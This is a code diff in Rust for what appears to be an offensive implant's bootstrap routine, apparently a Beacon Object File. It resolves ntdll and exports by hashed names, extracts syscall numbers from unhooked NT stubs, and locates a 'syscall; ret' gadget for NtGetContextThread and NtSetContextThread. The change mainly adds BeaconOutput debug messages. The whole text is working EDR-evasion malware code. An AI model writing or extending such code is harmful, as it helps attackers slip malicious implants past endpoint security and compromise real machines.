@@ -2,6 +2,14 @@ use core::arch::naked_asm;
 use opsec_peb::{ModuleHandle, resolve_module, resolve_export};
 use opsec_strcrypt::hash;
 
+unsafe extern "C" { fn BeaconOutput(kind: i32, data: *const u8, len: i32); }
+macro_rules! bdbg {
+    ($msg:literal) => {{
+        let b: &[u8] = $msg;
+        unsafe { BeaconOutput(0x0D, b.as_ptr(), b.len() as i32); }
+    }}
+}
+
 /// Extract SSN from clean NT stub: `4C 8B D1  B8 ?? ?? ?? ??  ...`
 /// Returns Some(ssn) if unhooked, None if the prologue looks patched.
 pub unsafe fn extract_ssn(stub: *const u8) -> Option<u32> {
@@ -55,31 +63,38 @@ pub struct Bootstrap {
 
 impl Bootstrap {
     pub unsafe fn init() -> Result<Self, Error> {
+        bdbg!(b"[bs] resolve ntdll\n");
         let ntdll = unsafe {
             resolve_module(hash!("ntdll.dll")).ok_or(Error::NtdllNotFound)?
         };
+        bdbg!(b"[bs] ntdll ok\n");
 
+        bdbg!(b"[bs] resolve get_ctx\n");
         let get_ctx = unsafe {
             resolve_export(ntdll, hash!("NtGetContextThread"))
                 .ok_or(Error::StubNotFound("NtGetContextThread"))? as *const u8
         };
+        bdbg!(b"[bs] get_ctx ok\n");
+
+        bdbg!(b"[bs] resolve set_ctx\n");
         let set_ctx = unsafe {
             resolve_export(ntdll, hash!("NtSetContextThread"))
                 .ok_or(Error::StubNotFound("NtSetContextThread"))? as *const u8
         };
+        bdbg!(b"[bs] set_ctx ok\n");
 
-        let get_ctx_ssn = unsafe {
-            extract_ssn(get_ctx).unwrap_or(0)
-        };
-        let set_ctx_ssn = unsafe {
-            extract_ssn(set_ctx).unwrap_or(0)
-        };
+        let get_ctx_ssn = unsafe { extract_ssn(get_ctx).unwrap_or(0) };
+        let set_ctx_ssn = unsafe { extract_ssn(set_ctx).unwrap_or(0) };
+        bdbg!(b"[bs] ssns extracted\n");
 
+        bdbg!(b"[bs] pe_size_of_image\n");
         let size = unsafe { pe_size_of_image(ntdll) };
+        bdbg!(b"[bs] find_syscall_ret\n");
         let gadget = unsafe {
             crate::gadget::find_syscall_ret(ntdll.as_usize(), size)
                 .ok_or(Error::GadgetNotFound)?
         };
+        bdbg!(b"[bs] gadget found\n");
 
         Ok(Bootstrap { ntdll, gadget, get_ctx, get_ctx_ssn, set_ctx, set_ctx_ssn })
     }
